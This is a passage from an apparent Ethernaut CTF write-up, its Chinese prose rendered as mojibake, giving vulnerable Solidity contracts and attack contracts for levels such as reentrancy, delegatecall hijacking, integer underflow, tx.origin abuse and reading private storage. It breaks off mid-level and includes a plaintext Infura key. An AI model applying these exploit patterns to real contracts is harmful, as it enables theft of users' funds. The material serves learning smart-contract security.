&#125;\n&#125;\n\nAnalyzeå­˜åœ¨ï¼ŒæŽ¥å—è½¬è´¦åŽè§¦å‘fallbackå‡½æ•°ï¼Œé¢˜ç›®åˆçº¦ä¸­çš„receiveå‡½æ•°\nAttackpragma solidity ^0.6.0;\nimport \"e1.sol\";\ncontract attack &#123;\n    Fallback public e;\n    address payable a = 0xd9145CCE52D386f254917e481eB44e9943F39138;\n    constructor(address payable fallbackaddress) public payable&#123;e=Fallback(fallbackaddress);&#125;\n    function getcontribution() public &#123;\n       e.contribute&#123;value:0.0001 ether&#125;();\n    &#125;\n    function changeowner() public &#123;\n        a.call&#123;value:0.0001 ether&#125;(\"\");\n        //a.send(0.0001 ether);\n    &#125;\n    function getmoney() public&#123;\n        e.withdraw();\n    &#125;\n&#125;\n\n2.fallout\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šèŽ·å¾—ä»¥ä¸‹åˆçº¦çš„æ‰€æœ‰æƒ\nCodepragma solidity ^0.6.0;\n\ncontract Fallout &#123;\n  mapping (address => uint) allocations;\n  address payable public owner;\n\n\n  /* constructor */\n  function Fal1out() public payable &#123;\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  &#125;\n\n  modifier onlyOwner &#123;\n\t        require(\n\t            msg.sender == owner,\n\t            \"caller is not the owner\"\n\t        );\n\t        _;\n\t    &#125;\n\n  function allocate() public payable &#123;\n    allocations[msg.sender] = allocations[msg.sender]+(msg.value);\n  &#125;\n\n  function sendAllocation(address payable allocator) public &#123;\n    require(allocations[allocator] > 0);\n    allocator.transfer(allocations[allocator]);\n  &#125;\n\n  function collectAllocations() public onlyOwner &#123;\n    msg.sender.transfer(address(this).balance);\n  &#125;\n\n  function allocatorBalance(address allocator) public view returns (uint) &#123;\n    return allocations[allocator];\n  &#125;\n&#125;\n\nAnalyzeFal1out()å‡½æ•°æ²¡æœ‰è¿›è¡Œonlyowneré™åˆ¶ï¼Œåªè¦è°ƒç”¨å³å¯èŽ·å¾—æ›´æ”¹owner\nAttackpragma solidity ^0.6.0;\nimport \"e2.sol\";\ncontract attack&#123;\n    Fallout public e;\n    constructor (address payable falloutaddress)public payable &#123;e=Fallout(falloutaddress);&#125;\n    function getowner() public&#123;\n        e.Fal1out&#123;value:1 wei&#125;();\n    &#125;\n&#125;\n\n2.coin flip\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šè¿™æ˜¯ä¸€ä¸ªæŽ·ç¡¬å¸çš„æ¸¸æˆï¼Œä½ éœ€è¦è¿žç»­çš„çŒœå¯¹ç»“æžœã€‚å®Œæˆè¿™ä¸€å…³ï¼Œä½ éœ€è¦é€šè¿‡ä½ çš„è¶…èƒ½åŠ›æ¥è¿žç»­çŒœå¯¹åæ¬¡ã€‚\nCode// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract CoinFlip &#123;\n\n  using SafeMath for uint256;\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() public &#123;\n    consecutiveWins = 0;\n  &#125;\n\n  function flip(bool _guess) public returns (bool) &#123;\n    uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n\n    if (lastHash == blockValue) &#123;\n      revert();\n    &#125;\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue.div(FACTOR);\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) &#123;\n      consecutiveWins++;\n      return true;\n    &#125; else &#123;\n      consecutiveWins = 0;\n      return false;\n    &#125;\n  &#125;\n&#125;\n\nAnalyze\nä»¥å¤ªåŠæ¯14ç§’äº§ç”Ÿä¸€ä¸ªåŒºå—ï¼Œæ‰€ä»¥block.numberæ˜¯å½“å‰çš„åŒºå—ï¼Œåœ¨è¿™ä¸ªæ—¶é—´æ®µçš„äº¤æ˜“ä¼šè¢«æ‰“åŒ…è¿›è¿™ä¸ªåŒºå—æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¡ç®—é¢˜ç›®ä¸­çš„blockvalue\nå› ä¸ºæœ‰if (lastHash &#x3D;&#x3D; blockValue)çš„é™åˆ¶ï¼Œæ‰€ä»¥è¿žç»­å¤šæ¬¡è°ƒç”¨å¯èƒ½ä¼šå¤±è´¥\nAttackpragma solidity ^0.6.0;\n\n\n\ncontract CoinFlip &#123;\n\n  function flip(bool _guess) public returns (bool) &#123;\n\n \n&#125;\n&#125;\ncontract attack &#123;\n    CoinFlip constant private target = CoinFlip(0x8732271d55EA7cb0B28492932fabE9cE2eD06F83);\n    function pwn() public&#123;\n          uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n          uint256 blockValue=uint (blockhash(block.number-1));\n          uint256 coinFlip = blockValue/FACTOR;\n          bool side = coinFlip == 1 ? true : false;\n          target.flip(side);\n    &#125;\n&#125;\n\n\n4.Telephone\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šå°†ownerå˜æˆè‡ªå·±\nCodepragma solidity ^0.6.0;\n\ncontract Telephone &#123;\n\n  address public owner;\n\n  constructor() public &#123;\n    owner = msg.sender;\n  &#125;\n\n  function changeOwner(address _owner) public &#123;\n    if (tx.origin != msg.sender) &#123;\n      owner = _owner;\n    &#125;\n  &#125;\n&#125;\n\nAnalyze\næ²¡ä»€ä¹ˆéš¾ç‚¹ä¸»è¦å°±æ˜¯åŒºåˆ†msg.senderå’Œtx.originçš„åŒºåˆ«ã€‚åœ¨ä¸€ä¸ªç®€å•çš„è°ƒç”¨é“¾A&gt;B&gt;C&gt;Dä¸­å¦‚æžœDå†…çš„å…¨å±€å˜é‡ä¸ºmsg.senderå®ƒå°†æŒ‡å‘æœ€è¿‘ä¸€ç¬”çš„äº¤æ˜“åœ°å€ï¼Œä¹Ÿå°±æ˜¯Cï¼›å¦‚æžœDå†…çš„å…¨å±€å˜é‡æ˜¯tx.orginï¼Œå®ƒå°±ä¼šæŒ‡å‘æœ€åˆå‘é€äº¤æ˜“çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯A\nAttackcontract Attack &#123;\n    Telephone constant private target = Telephone(0x6F28D4210D178F6B37bFBe8D1dD8b08402EaC12a);\n    function hack() public &#123;\n        target.changeOwner(msg.sender);\n    &#125;\n&#125;\n\n5.Token\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šè¿™ä¸€å…³çš„ç›®æ ‡æ˜¯æ”»ç ´ä¸‹é¢è¿™ä¸ªåŸºç¡€ token åˆçº¦ï¼Œä½ æœ€å¼€å§‹æœ‰20ä¸ª token, å¦‚æžœä½ é€šè¿‡æŸç§æ–¹æ³•å¯ä»¥å¢žåŠ ä½ æ‰‹ä¸­çš„ token æ•°é‡,ä½ å°±å¯ä»¥é€šè¿‡è¿™ä¸€å…³,å½“ç„¶è¶Šå¤šè¶Šå¥½\nCodepragma solidity ^0.6.0;\n\ncontract Token &#123;\n\n  mapping(address => uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public &#123;\n    balances[msg.sender] = totalSupply = _initialSupply;\n  &#125;\n\n  function transfer(address _to, uint _value) public returns (bool) &#123;\n    require(balances[msg.sender] - _value >= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  &#125;\n\n  function balanceOf(address _owner) public view returns (uint balance) &#123;\n    return balances[_owner];\n  &#125;\n&#125;\ncontract attack&#123;\n    Token constant private target = Token(0x54101E29C84002f75B5c2378e43A56D6174460A8);\n    function hack(address to,uint value) public &#123;\n        target.transfer(to,value);\n    &#125;\n&#125;\n\nAnalyzeæ•´æ•°æº¢å‡ºæ¼æ´žï¼Œtransferå‡½æ•°çš„valueå¯æŽ§ï¼Œæž„é€ ä¸‹æº¢å³å¯\nAttackpragma solidity ^0.6.0;\n\ncontract Token &#123;\n\n  mapping(address &#x3D;&gt; uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public &#123;\n    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;\n  &#125;\n\n  function transfer(address _to, uint _value) public returns (bool) &#123;\n    require(balances[msg.sender] - _value &gt;&#x3D; 0);\n    balances[msg.sender] -&#x3D; _value;\n    balances[_to] +&#x3D; _value;\n    return true;\n  &#125;\n\n  function balanceOf(address _owner) public view returns (uint balance) &#123;\n    return balances[_owner];\n  &#125;\n&#125;\ncontract attack&#123;\n    Token constant private target &#x3D; Token(0x54101E29C84002f75B5c2378e43A56D6174460A8);\n    function hack(address to,uint value) public &#123;\n        target.transfer(to,value);\n    &#125;\n&#125;\n\n\n\n6.Vault\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šæ‰“å¼€ vault æ¥é€šè¿‡è¿™ä¸€å…³!\nCodepragma solidity ^0.6.0;\n\ncontract Vault &#123;\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) public &#123;\n    locked = true;\n    password = _password;\n  &#125;\n\n  function unlock(bytes32 _password) public &#123;\n    if (password == _password) &#123;\n      locked = false;\n    &#125;\n  &#125;\n&#125;\n\nAnalyzeäº‹å…ˆäº†è§£å˜é‡å­˜å‚¨æœºåˆ¶ï¼Œå¾—çŸ¥passwordå­˜å‚¨åœ¨slot1ï¼ˆboolå æ®slot0ï¼‰\nAttackpragma solidity ^0.6.0;\n\ncontract Vault &#123;\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) public &#123;\n    locked &#x3D; true;\n    password &#x3D; _password;\n  &#125;\n\n  function unlock(bytes32 _password) public &#123;\n    if (password &#x3D;&#x3D; _password) &#123;\n      locked &#x3D; false;\n    &#125;\n  &#125;\n&#125;\ncontract attack&#123;\n    Vault constant private target&#x3D;Vault(0xB873A0f46Db8182Bdb4EAd9f95742EaeaBB5295C);\n    function unlock(bytes32 _password) public &#123;\n        target.unlock(_password);\n    &#125;\n&#125;\n\nfrom web3 import Web3,HTTPProvider\nimport json\nhttp = 'https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'\nweb3 = Web3(HTTPProvider(http))\ntrade_hash = '0x119ce1ec582b1672346a2e40ad31bac13a104e047bb2b5ce53c7f46918bddc51'\n\nprint(web3.eth.getTransaction(trade_hash))\nprint(web3.eth.getTransactionReceipt(trade_hash))\nprint(web3.eth.getStorageAt(\"0xB873A0f46Db8182Bdb4EAd9f95742EaeaBB5295C\", \"1\"))//èŽ·å¾—å­˜å‚¨åœ¨slot1ä¸‹çš„_passwordï¼Œç»“æžœä¸ºï¼šA very strong secret password :)\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0xB873A0f46Db8182Bdb4EAd9f95742EaeaBB5295C\", \"1\")))//èŽ·å¾—å­˜å‚¨åœ¨slot1ä¸‹çš„_passwordå¹¶è½¬ä¸º16è¿›åˆ¶ï¼Œç»“æžœä¸ºï¼š(0x)412076657279207374726f6e67207365637265742070617373776f7264203a29ï¼Œæ³¨æ„åœ¨å¼€å¤´æ·»åŠ 0x\n\n\n\næŽ¥ä¸‹æ¥éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶ä¼ å…¥ç›¸åº”ç»“æžœï¼Œé€šè¿‡æœ¬å…³\n7.Delegation\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šè¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ç”³æ˜Žä½ å¯¹ä½ åˆ›å»ºå®žä¾‹çš„æ‰€æœ‰æƒ.\n è¿™å¯èƒ½æœ‰å¸®åŠ©\n\nä»”ç»†çœ‹solidityæ–‡æ¡£å…³äºŽ delegatecall çš„ä½Žçº§å‡½æ•°, ä»–æ€Žä¹ˆè¿è¡Œçš„, ä»–å¦‚ä½•å°†æ“ä½œå§”æ‰˜ç»™é“¾ä¸Šåº“, ä»¥åŠä»–å¯¹æ‰§è¡Œçš„å½±å“.\nFallback æ–¹æ³•\næ–¹æ³• ID\n\nCodepragma solidity ^0.6.0;\n\ncontract Delegate &#123;\n\n  address public owner;\n\n  constructor(address _owner) public &#123;\n    owner = _owner;\n  &#125;\n\n  function pwn() public &#123;\n    owner = msg.sender;\n  &#125;\n&#125;\n\ncontract Delegation &#123;\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) public &#123;\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  &#125;\n\n  fallback() external &#123;\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) &#123;\n      this;\n    &#125;\n  &#125;\n&#125;\n\nAnalyzeä¸‰ç§è°ƒç”¨æ–¹å¼çš„å¼‚åŒç‚¹\n\ncall: æœ€å¸¸ç”¨çš„è°ƒç”¨æ–¹å¼ï¼Œè°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œæ‰§è¡ŒçŽ¯å¢ƒä¸ºè¢«è°ƒç”¨è€…çš„è¿è¡ŒçŽ¯å¢ƒ(åˆçº¦çš„ storage)ã€‚\ndelegatecall: è°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¸ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œä½†æ‰§è¡ŒçŽ¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡ŒçŽ¯å¢ƒã€‚\ncallcode: è°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œä½†æ‰§è¡ŒçŽ¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡ŒçŽ¯å¢ƒã€‚+\n\n\n\næƒ…å†µ 1ï¼šcallAåˆçº¦ï¼štemp1 &#x3D; 0temp2 &#x3D; 0\nBåˆçº¦ï¼štemp1 &#x3D; Aåˆçº¦åœ°å€temp2 &#x3D; 100\nè¯´æ˜Žï¼šcallè°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦åœ°å€ï¼‰ï¼Œæ‰§è¡ŒçŽ¯å¢ƒä¸ºè¢«è°ƒç”¨è€…ï¼ˆBåˆçº¦ï¼‰çš„è¿è¡ŒçŽ¯å¢ƒ(è¿è¡ŒçŽ¯å¢ƒæŒ‡åˆçº¦çš„ storage)\n\n\næƒ…å†µ 2ï¼šdelegatecallAåˆçº¦ï¼štemp1 &#x3D; è°ƒç”¨Aåˆçº¦çš„ä»¥å¤ªåŠè´¦å·åœ°å€temp2 &#x3D; 100\nBåˆçº¦ï¼štemp1 &#x3D; 0temp2 &#x3D; 0\nè¯´æ˜Žï¼šdelegatecallè°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¸ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦åœ°å€ï¼‰ï¼Œä½†æ‰§è¡ŒçŽ¯å¢ƒä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦ï¼‰çš„è¿è¡ŒçŽ¯å¢ƒ\n\næƒ…å†µ 3ï¼šcallcodeAåˆçº¦ï¼štemp1 &#x3D; Aåˆçº¦åœ°å€temp2 &#x3D; 100\nBåˆçº¦ï¼štemp1 &#x3D; 0temp2 &#x3D; 0\nè¯´æ˜Žï¼šcallcodeè°ƒç”¨åŽå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦åœ°å€ï¼‰ï¼Œä½†æ‰§è¡ŒçŽ¯å¢ƒä¸ºè°ƒç”¨è€…ï¼ˆAåˆçº¦ï¼‰çš„è¿è¡ŒçŽ¯å¢ƒã€‚\n\nAttackpoc1\né¦–å…ˆå­¦ä¹ å°†å‡½æ•°è½¬æ¢ä¸ºbytesæ ¼å¼\ncontract transform&#123;\n    bytes4 public result;\n    function trans() public &#123;\n        result&#x3D;bytes(keccak256(&quot;pwn()&quot;));\n    &#125;\n&#125;&#x2F;&#x2F;ç»“æžœä¸º0xdd365b8b\næŽ¥ä¸‹æ¥è¿›è¡Œæ”»å‡»\nawait contract.sendTransaction(&#123;data:&quot;0xdd365b8b&quot;&#125;)\n\npoc2\ncallå‡½æ•°å­¦ä¹ é“¾æŽ¥â‘ \ncallå‡½æ•°å­¦ä¹ é“¾æŽ¥â‘¡\ncallå‡½æ•°å­¦ä¹ é“¾æŽ¥â‘¢\ncontract attack&#123;\n    address target &#x3D;0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005;\n    bytes4 public result;\n    function trandform()public&#123;\n    result&#x3D;bytes4(keccak256(&quot;pwn()&quot;));\n&#125;&#x2F;&#x2F;èŽ·å¾—bytes4ç­¾å\n    function pwn() public payable&#123;\n    target.call(abi.encodePacked(result,&quot;&quot;));\n&#125;&#x2F;&#x2F;ä¼ å…¥å‚æ•°è¿›è¡Œæ”»å‡»\n&#125;\n\n\n\n8.Force\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šæœ‰äº›åˆçº¦å°±æ˜¯æ‹’ç»ä½ çš„ä»˜æ¬¾,å°±æ˜¯è¿™ä¹ˆä»»æ€§Â¯\\_(ãƒ„)_/Â¯ï¼Œè¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ä½¿åˆçº¦çš„ä½™é¢å¤§äºŽ0\n è¿™å¯èƒ½æœ‰å¸®åŠ©:\n\nFallback æ–¹æ³•\næœ‰æ—¶å€™æ”»å‡»ä¸€ä¸ªåˆçº¦æœ€å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦.\né˜…è¯»ä¸Šæ–¹çš„å¸®åŠ©é¡µé¢, â€œæŽ§åˆ¶å°ä¹‹å¤–â€ éƒ¨åˆ†\n\nCodepragma solidity ^0.6.0;\n\ncontract Force &#123;/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =Ã¸= /\n (______)__m_m)\n\n*/&#125;\n\n\nAnalyzeåˆçº¦ä¸ºç©ºç™½åˆçº¦ï¼Œè€Œé¢˜ç›®è¦æ±‚æ˜¯ä½¿åˆçº¦ä½™é¢å¤§äºŽ0ï¼Œæ‰€ä»¥æƒ³åˆ°äº†è‡ªæ¯å‡½æ•°ï¼Œå¯ä»¥å¼ºåˆ¶æ€§å‘ç›®æ ‡è½¬è´¦\nAttackpragma solidity ^0.6.0;\ncontract Attack&#123;\n\n    function attack(address payable target) public payable &#123;\n        selfdestruct(target);\n    &#125;\n&#125;//é”€æ¯å½“å‰åˆçº¦ï¼Œå¹¶ä¸”æŠŠå½“å‰åˆçº¦çš„ä½™é¢å‘é€æŒ‡å®šåœ°å€ï¼Œï¼Œæ‰§è¡ŒKillæ–¹æ³•ï¼Œå¹¶æŒ‡å®šä¸€ä¸ªaddressï¼›æ‰§è¡ŒåŽï¼Œå½“å‰åˆçº¦å°†è¢«é”€æ¯ï¼Œå½“å‰åˆçº¦çš„ä»¥å¤ªå¸å°†è¢«å‘é€è‡³è¿™ä¸ªæŒ‡å®šçš„addressã€‚ä¸”æ­¤åˆçº¦ä¸å†æœ‰å¯æ‰§è¡Œçš„æ–¹æ³•\n\n\n9.King\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šä¸‹é¢çš„åˆçº¦è¡¨ç¤ºäº†ä¸€ä¸ªå¾ˆç®€å•çš„æ¸¸æˆ: ä»»ä½•ä¸€ä¸ªå‘é€äº†é«˜äºŽç›®å‰ä»·æ ¼çš„äººå°†æˆä¸ºæ–°çš„å›½çŽ‹. åœ¨è¿™ä¸ªæƒ…å†µä¸‹, ä¸Šä¸€ä¸ªå›½çŽ‹å°†ä¼šèŽ·å¾—æ–°çš„å‡ºä»·, è¿™æ ·å¯ä»¥èµšå¾—ä¸€äº›ä»¥å¤ªå¸. çœ‹èµ·æ¥åƒæ˜¯åºžæ°éª—å±€.è¿™ä¹ˆæœ‰è¶£çš„æ¸¸æˆ, ä½ çš„ç›®æ ‡æ˜¯æ”»ç ´ä»–.å½“ä½ æäº¤å®žä¾‹ç»™å…³å¡æ—¶, å…³å¡ä¼šé‡æ–°ç”³æ˜ŽçŽ‹ä½. ä½ éœ€è¦é˜»æ­¢ä»–é‡èŽ·çŽ‹ä½æ¥é€šè¿‡è¿™ä¸€å…³.\nCodepragma solidity ^0.6.0;\n\ncontract King &#123;\n\n  address payable king;\n  uint public prize;\n  address payable public owner;\n\n  constructor() public payable &#123;\n    owner = msg.sender;  \n    king = msg.sender;\n    prize = msg.value;\n  &#125;\n\n  receive() external payable &#123;\n    require(msg.value >= prize || msg.sender == owner);\n    king.transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  &#125;\n\n  function _king() public view returns (address payable) &#123;\n    return king;\n  &#125;\n&#125;\n\nAnalyzeå®žä¾‹ç”ŸæˆåŽè¦ä½¿ç”¨web3.jsæŸ¥è¯¢åŽŸå§‹çš„prizeï¼Œåˆ†æžåˆçº¦å¯çŸ¥prizeå­˜å‚¨åœ¨slot1ï¼Œkingå­˜å‚¨åœ¨slot0\nfrom web3 import Web3,HTTPProvider\nimport json,binascii\nhttp = 'https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'\nweb3 = Web3(HTTPProvider(http))\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909\", \"1\")))//åˆçº¦prizeæŸ¥è¯¢\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909\", \"0\")))//åˆçº¦ä¸­çš„kingæŸ¥è¯¢\n\né¢˜ç›®ä¼šè¿›è¡Œkingçš„é‡ç”³ï¼Œè€Œtransferå‡½æ•°ä¸åŒäºŽcallå’Œsendï¼Œcallå’Œsendå‡½æ•°æ‰§è¡ŒåŽä¼šè¿”å›žtrueæˆ–è€…falseï¼Œtransferå‡½æ•°æ‰§è¡Œå¤±è´¥åŽä¼šè¿›è¡Œå›žæ»š(revert)æ‰€ä»¥æˆ‘ä»¬å°†kingå˜æˆè‡ªå·±åŽæäº¤å®žä¾‹æ—¶è¦é˜»æ­¢å…³å¡å¯¹äºŽkingçš„é‡ç”³ï¼Œç®€å•æ¥è¯´å°±æ˜¯è®©å…³å¡è§¦å‘receiveå‡½æ•°æ—¶å¤±è´¥ã€‚æ­¤æ—¶è¿™é“é¢˜æœ‰ä¸¤ä¸ªåˆ‡å…¥ç‚¹â‘ å¯ä»¥ä½¿ç”¨require(false),ä½¿å¾—transferå‡½æ•°å‘ç”Ÿå›žæ»šåˆ‡å…¥ç‚¹â‘¡ç›´æŽ¥ä½¿ç”¨revertè®©å…³å¡åœ¨æƒ³æ”»å‡»åˆçº¦è½¬è´¦æ—¶å¤±è´¥ä»¥ä¸Šä¸¤ç§æ–¹æ³•å¯ä»¥ä½¿æ¼æ´žåˆçº¦ä¸­çš„transferå‡½æ•°æ‰§è¡Œå¤±è´¥ä»Žè€Œè¿›è¡Œå›žæ»šå¯¼è‡´kingçš„é‡ç”³å¤±è´¥\näº†è§£åˆ°äº†ï¼Œtransferæ‰§è¡Œå¤±è´¥åŽä¼šå›žæ»štransferä¹‹å‰çš„ä»£ç (ä½†æ˜¯transferæœ¬èº«ä¸ä¼šè¿›è¡Œå›žæ»š)(è¿™æ˜¯è‡ªå·±çš„ç†è§£ï¼Œåº”è¯¥æ˜¯æ­£ç¡®çš„)\nAttackpoc1\ncontract attack&#123;\n    address target =0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909;\n    function attack() payable public &#123;\n        target.call&#123;value : 0.001 ether&#125;(\"\");\n    &#125;\n    fallback() external payable &#123;\n        require(false);\n    &#125;\n&#125;\n\npoc2\ncontract attack&#123;\n    address target &#x3D;0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909;\n    function attack() payable public &#123;\n        target.call&#123;value : 0.001 ether&#125;(&quot;&quot;);\n    &#125;\n    fallback() external payable &#123;\n        revert();\n    &#125;\n&#125;\n\nå†™å¥½æ”»å‡»åˆçº¦åŽè¿›è¡Œäº†n+næ¬¡æ”»å‡»ï¼Œevmä¸­æ˜¾ç¤ºäº¤æ˜“æˆåŠŸä½†æ˜¯_kingå§‹ç»ˆä¸å˜ï¼Œå¡ä½äº†çº¦ä¸¤ä¸ªå°æ—¶ä»¥åŽæ‰“å¼€äº†etherscanå‘çŽ°äº†ä¸‡æ¶çš„Out Of Gasé—®é¢˜\n\nè°ƒé«˜gasé™åˆ¶åŽå†æ¬¡å°è¯•æˆåŠŸ\n\n\n10.Re-entrancy\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šè¿™ä¸€å…³çš„ç›®æ ‡æ˜¯å·èµ°åˆçº¦çš„æ‰€æœ‰èµ„äº§.\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Reentrance &#123;\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable &#123;\n    balances[_to] = balances[_to].add(msg.value);\n  &#125;\n\n  function balanceOf(address _who) public view returns (uint balance) &#123;\n    return balances[_who];\n  &#125;\n\n  function withdraw(uint _amount) public &#123;\n    if(balances[msg.sender] >= _amount) &#123;\n      (bool result,) = msg.sender.call&#123;value:_amount&#125;(\"\");\n      if(result) &#123;\n        _amount;\n      &#125;\n      balances[msg.sender] -= _amount;\n    &#125;\n  &#125;\n\n  receive() external payable &#123;&#125;\n&#125;\n\nAnalyzeç»å…¸çš„é‡å…¥æ¼æ´žï¼Œä½¿ç”¨äº†callè½¬è´¦ï¼Œå¹¶ä¸”balances[msg.sender]åœ¨è½¬è´¦å®Œæˆä¹‹åŽæ‰è¿›è¡Œæ›´æ–°ï¼Œæ‰€ä»¥æ”»å‡»åˆçº¦ä¸­çš„fallbackå¯ä»¥è¿›è¡Œé‡å…¥\nAttackcontract attack&#123;\n    test constant private target=test(0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2);\n    function cunqian() public payable&#123;\n        target.donate&#123;value: 0.001 ether&#125;(address(this));\n    &#125;\n    function tuiqian()public&#123;\n        target.withdraw(0.001 ether);\n    &#125;\n    function check() public view returns(uint)&#123;\n        return address(this).balance;\n    &#125;\n    fallback() external payable&#123;\n        if(address(0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2).balance>=0.001 ether)\n        target.withdraw(0.001 ether);\n    &#125;\n     function reuse() public &#123;\n        msg.sender.transfer(address(this).balance);\n    &#125;//å›žæ”¶å†åˆ©ç”¨ï¼Œå‹¤ä¿­èŠ‚çº¦\n    //function destroy(address payable addr)public payable&#123;\n    //    selfdestruct(addr);\n    //&#125;è‡ªæ¯è½¬è´¦æ³•ï¼Œå’Œreuse()ç”¨é€”ä¸€æ ·ï¼Œå›žæ”¶ä»£å¸(å…¶ä¸­addræ˜¯é’±åŒ…åœ°å€)\n&#125;\n\n11.Elevator\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šç”µæ¢¯ä¸ä¼šè®©ä½ è¾¾åˆ°å¤§æ¥¼é¡¶éƒ¨, å¯¹å§?ä½¿topå˜æˆtrue\nCodepragma solidity ^0.6.0;\ninterface Building &#123;\n  function isLastFloor(uint) external returns (bool);\n&#125;\ncontract Elevator &#123;\n  bool public top;\n  uint public floor;\n\n  function goTo(uint _floor) public &#123;\n    Building building = Building(msg.sender);\n    if (! building.isLastFloor(_floor)) &#123;\n      floor = _floor;\n      top = building.isLastFloor(floor);\n    &#125;\n  &#125;\n&#125;\n\nAnalyzeåœ¨è¿™ä¸ªifè¯­å¥ä¸­è¿›è¡Œäº†ä¸¤æ¬¡building.isLastFloor(_floor)è°ƒç”¨ï¼Œæ‰€ä»¥è¦å…ˆå°†builidingå˜æˆæ”»å‡»åˆçº¦ï¼Œç„¶åŽç¬¬ä¸€æ¬¡è°ƒç”¨ä¼ å…¥falseç¬¬äºŒæ¬¡ä¼ å…¥trueå³å¯\nAttackcontract attack&#123;\n    bool public i=true;\n    function isLastFloor(uint)public returns(bool)&#123;\n        i=!i;\n        return i;\n    &#125;//ä¸¤æ¬¡è°ƒç”¨ï¼Œifåˆ¤æ–­æ—¶ä¼ å…¥falseï¼Œæ›´æ”¹topæ—¶ä¼ å…¥true\n    function a(uint fllor) public&#123;\n        Elevator target=Elevator(0xDA0bab807633f07f013f94DD0E6A4F96F8742B53);//è®¾ç½®è¢«æ”»å‡»åˆçº¦åœ°å€\n        target.goTo(fllor);//è®©é¢˜ç›®ä¸­çš„è°ƒç”¨åœ°å€å˜ä¸ºæ”»å‡»åˆçº¦\n    &#125;\n&#125;\n\n12.Privacy\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šThe creator of this contract was careful enough to protect the sensitive areas of its storage. Unlock this contract to beat the level.\nThings that might help:\n\nUnderstanding how storage works\nUnderstanding how parameter parsing works\nUnderstanding how casting works\n\nTips:\n\nRemember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.\n\nCodepragma solidity ^0.6.0;\n\ncontract Privacy &#123;\n\n  bool public locked = true;\n  uint256 public ID = block.timestamp;\n  uint8 private flattening = 10;\n  uint8 private denomination = 255;\n  uint16 private awkwardness = uint16(now);\n  bytes32[3] private data;\n\n  constructor(bytes32[3] memory _data) public &#123;\n    data = _data;\n  &#125;\n  \n  function unlock(bytes16 _key) public &#123;\n    require(_key == bytes16(data[2]));\n    locked = false;\n  